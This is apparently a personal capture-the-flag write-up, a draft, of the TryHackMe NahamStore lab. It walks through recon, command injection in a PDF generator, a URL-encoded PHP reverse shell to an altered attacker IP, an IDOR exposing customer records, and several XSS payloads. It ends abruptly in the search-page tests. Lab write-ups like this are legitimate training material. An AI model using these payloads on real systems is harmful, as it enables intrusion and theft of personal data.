this is just a backup for now!

# NahamStore.md

```
this will be a long read and hopefully an interesting room. 

I will be using tools I have not used for some time and probably some new ones too!
```

**Let's go !**

### Briefing:
 - we are given nahamstore.thm, www.nahamstore.thm and something.nahamstore.thm as a start
 - we are to do a full (guided) pentest of all it's subdirectories and subdomains
 - there will be XSS, CSRF, IDOR, LFI, SSRF, XXE, RCE, SQLi and more

TARGET_IP = 10.112.145.197
REPLACE_TARGET_IP = 

### Recon

add `10.112.145.197 something.nahamstore.thm www.nahamstore.thm nahamstore.thm` to our hosts file (sudo nano /etc/hosts)

nmapping nahamstore.thm, we discover this:

```
sudo nmap -sS -p- nahamstore.thm        

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 11:26 +0200
Nmap scan report for nahamstore.thm (10.112.145.197)
Host is up (0.028s latency).
rDNS record for 10.112.145.197: something.nahamstore.thm
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```

so we have to keep in mind to also try nahamstore.thm:8000/

some gobuster to dip our toes

`gobuster dir -u http://nahamstore.thm/ -w /usr/share/wordlists/dirb/common.txt -x js,php,txt`

unfortunately nothing usable comes up as robots.txt is empty and /uploads looks like this:
```
uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
```

this is weird, maybe dirsearch helps?

`dirsearch -u nahamstore.thm`

let's also try the higher port

`dirsearch -u nahamstore.thm:8000`

ohhh, nice  
[11:29:49] 302 -    0B  - /admin  ->  /admin/login                          
[11:29:49] 302 -    0B  - /admin/  ->  /admin/login                         
[11:29:49] 200 -    1KB - /admin/login                                      
[11:30:03] 200 -   30B  - /robots.txt 

now we `wfuzz`...

first we probe how the fuzzing will look and we will update our parameters accordingly: `wfuzz -u nahamstore.thm -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.nahamstore.thm"`

oki, too many not real sites with code 200 and 65 words (65W), let's disable those and also add 404 filtering just in case

`wfuzz -u nahamstore.thm -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.nahamstore.thm" --hc 404 --hw 65`

this gave us pretty good output with just about 10 things to go through, so we add all these to our hosts file

`10.112.145.197 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm`

before we do so, let's get back to nahamstore.thm:8000 and look at /admin/login

I logged in with admin / admin

we can change some campaign site html, let's leave that for later

gobuster time
`--xl <length>` excludes length or range (eg. --xl 100-200)

`gobuster dir -u http://shop.nahamstore.thm -w /usr/share/wordlists/dirb/common.txt -t 40 -x js,php,txt --xl 194`

this one did not work well, because of the site having no actual content to go through

we also tried busting `stock.nahamstore.thm` but it was no use, looks like an intentional rabbit hole

now for marketing

`gobuster dir -u http://marketing.nahamstore.thm -w /usr/share/wordlists/dirb/common.txt -t 40 -x js,php,txt`

also not much...

I got myself a little hint that we should try buying something, so let's do that

we make an account, blah blah blah, get an order confirmation with a PDF receipt

this is where fun begins

#### command injection  
the pdf receipt request is very interesting

```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://nahamstore.thm
Connection: keep-alive
Referer: http://nahamstore.thm/account/orders/4
Cookie: session=a86a7e01f2643aa383393750feb2aee8; token=2f0f02de46a7ddbf68d1f02b6c6c3946
Upgrade-Insecure-Requests: 1
Priority: u=0, i

what=order&id=4
```

here we can get execution through injecting eg. the id command by wrapping it in backticks

so the request would be
```
...

what=order&id=4`id`
```

response:  
Cannot find order: 4uid=33(www-data) gid=33(www-data) groups=33(www-data)

#### reverse shell
I tried injecting a bash revshell, did not work, then I tried URL encoding it, also did not work

lastly I tried php, also with URL encoding, which finally got us a shell as www-data

we used PHP exec (the IP is altered, please dont sue)

`php%20-r%20%27%24sock%3Dfsockopen%28%22999.999.999.999%22%2C7777%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

have to upgrade:

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

ctrl + z

`stty raw -echo;fg`

2x enter key

there is no easy win unfortunately, we can'ŧ run sudo and there are no easy cronjobs, no one is in home, no super interesting files - brutal realism hits hard

10 minute manual exloration...

they really love subdomains tho...

`cat /etc/hosts`

```
127.0.0.1       nahamstore.thm
127.0.0.1       www.nahamstore.thm
172.17.0.1      stock.nahamstore.thm
172.17.0.1      marketing.nahamstore.thm
172.17.0.1      shop.nahamstore.thm
172.17.0.1      nahamstore-2020.nahamstore.thm
172.17.0.1      nahamstore-2020-dev.nahamstore.thm
10.131.104.72   internal-api.nahamstore.thm
```

we will be exploring these subdomains now

our hosts file is expanding...

`10.112.145.197 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm nahamstore-2020.nahamstore.thm nahamstore-2020-dev.nahamstore.thm internal-api.nahamstore.thm`

the first 2020 nahamstore seems to be dead

but the dev one not...

`dirsearch -u nahamstore-2020-dev.nahamstore.thm/`
```
302     0B   http://nahamstore-2020-dev.nahamstore.thm/api    -> REDIRECTS TO: /api/

200    47B   http://nahamstore-2020-dev.nahamstore.thm/api/
```

#### IDOR #1
so I continued with `dirsearch -u nahamstore-2020-dev.nahamstore.thm/api/`

we get:  
302 - 0B  - /api/customers  ->  /api/customers/

alright there seem to be missing GET/POST parameters, so we will whip up arjun

arjun did was not usable on this specific site, couldn't figure out why (weird unrelated python error)

anyways, the parameter name was obvious

`http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2`

we changed the ids to find some JJs social security number

now we are supposed to find XSS

### XSS

this room is wicked (as opposed to the usual "go here do that" philosophy of THM rooms), it's just "go find XSS, good luck"

very funny thing, I tried injecting JS through the products' id parameter

```
http://nahamstore.thm/product?id=2`<script>alert("xss")</script>

the request URL encoded itself and ran the JS

http://nahamstore.thm/product?id=2`%3Cscript%3Ealert(%22xss%22)%3C/script%3E

but also, we got an SQL syntax error

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` LIMIT 1' at line 1
```

upcoming parameter injection (JS, SQLi, bash) trial and error

i did only very basic tests on each of the following (failed attempts were not omitted for completeness)

#### site home

arjun -u http://nahamstore.thm/  
[+] Parameters found: r, q

was not able to inject these parameters, but...

the URL itself was not very well designed

```
http://nahamstore.thm/<script>alert("xss")</script>
```
success!

#### returns

arjun -u http://nahamstore.thm/returns  
[+] Extracted 2 parameters from response for testing: order_number, return_info  

not injectable in the URL, but the form itself is injectable:

return information form field looks like:

```js
<div>  
    <div><textarea class="form-control">USER_INPUT  
</textarea></div>  
</div>
```

so we will have to
- 1) close the textarea
- 2) close the div
- 3) inject our script
- 4) comment out the rest

input: 

```js
</textarea></div><script>alert("xss")</script>//
```

resulting code:

```js
<div>  
<textarea class="form-control"></textarea></div><script>alert("xss")</script>//  
</textarea>
</div>
```

succesful XSS!

I tried other fields, but they were label-type, and 

</label></div><script>alert("xss")</script>

#### login

arjun -u http://nahamstore.thm/login/  
[+] Extracted 2 parameters from response for testing: login_password, login_email  

#### register

arjun -u http://nahamstore.thm/register/  
[+] Extracted 2 parameters from response for testing: register_password, register_email  

#### search

`arjun -u http://nahamstore.thm/search`

[✓] parameter detected: q, based on: body length

http://nahamstore.thm/search?q=1`id`